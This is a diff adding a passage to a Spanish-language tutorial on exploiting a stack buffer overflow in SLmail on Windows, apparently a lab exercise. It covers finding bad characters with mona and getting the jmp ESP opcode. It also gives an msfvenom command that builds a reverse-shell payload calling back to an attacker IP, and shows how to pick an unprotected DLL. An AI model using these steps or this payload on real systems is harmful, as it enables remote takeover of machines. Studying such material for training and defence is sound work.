@@ -266,9 +266,25 @@ if __name__ == '__main__':
 
 ```
 
+
 ![](/assets/images/Stack-Buffer-Overflow-Windows/badchars.png)
 
 Vemos que ESP ahora vale 0151A128. Ahora ejecutamos en el inmunity `!mona compare -f C:\Users\Ximo\Desktop\SLmail\bytearray.bin -a 0151A128` y nos dice que el 00 es un badchar. Lo siguiente será eliminar del bytearray.txt y de nuestro script el 00 y volver a repetir el proceso hasta que `!mona compare` nos diga que ya no queda ningún badchar.
 
 ![](/assets/images/Stack-Buffer-Overflow-Windows/compare.png)
+
+En este caso, después de repetir el proceso 3 veces, mona nos dice que los badchars encontrados son 00, 0A y 0D. 
+
+Vamos a generar un shellcode que no contenga estos badchars, y que nos lance una conexión a nuestra ip, con el siguiente comando:
+
+`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.15 LPORT=443 -a x86 --platform windows EXITFUNC=thread -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c`
+
+Solo nos falta calcular el valor que tiene que tener EIP, que tiene que ser una dirección de memória que contenga un salto al ESP (jmp ESP), que es donde estará nuestro shellcode.
+
+Para ello ejecutamos otra utilidad de metasploit `/opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb` y estando dentro de la shell escribimos `jmp ESP`, lo que nos devuelve el opcode FFE4.
+
+Volvemos al inmunity y escribimos `!mona modules`. Esto nos sacará los módulos que utiliza el programa slmail, las dll que utiliza y las protecciones que tienen. Elegiremos una dll que tenga todas las protecciones en FALSE. En nuestro caso SLMFC.DLL.
+
+![](/assets/images/Stack-Buffer-Overflow-Windows/modules.png)
+
 
